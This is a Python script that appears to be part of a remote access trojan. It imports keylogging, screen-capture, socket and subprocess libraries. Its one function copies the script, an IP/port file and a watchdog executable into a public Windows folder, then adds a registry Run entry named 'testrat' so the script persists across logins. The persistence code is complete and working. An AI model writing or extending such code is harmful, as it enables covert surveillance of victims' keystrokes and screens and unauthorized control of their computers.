import socket
import subprocess
from pynput.keyboard import Key, Listener
import logging
import os
import shutil
import threading
import re
from PIL import ImageGrab, Image
import mss
import io
import sys
import signal
import time
import winreg as reg

def copy_to_root_and_set_startup():
    try:
        # Copy the script and IPPORT.txt to the root directory
        root_dir = "C:/Users/Public/Documents"
        script_path = os.path.abspath(__file__)
        ipport_path = os.path.join(os.path.dirname(script_path), "IPPORT.txt")
        watchdog_path = os.path.join(os.path.dirname(script_path), "watchdog.exe")

        print(f"Script path: {script_path}")
        print(f"IPPORT path: {ipport_path}")
        print(f"Watchdog path: {watchdog_path}")

        shutil.copy(script_path, root_dir)
        shutil.copy(ipport_path, root_dir)
        shutil.copy(watchdog_path, root_dir)

        # Set the script to run on startup
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "testrat", 0, reg.REG_SZ, os.path.join(root_dir, os.path.basename(script_path)))
        reg.CloseKey(open_key)
        print("Files copied and startup set successfully.")
    except Exception as e:
        print(f"Failed to copy to root and set startup: {e}")

# Call the function to test
copy_to_root_and_set_startup()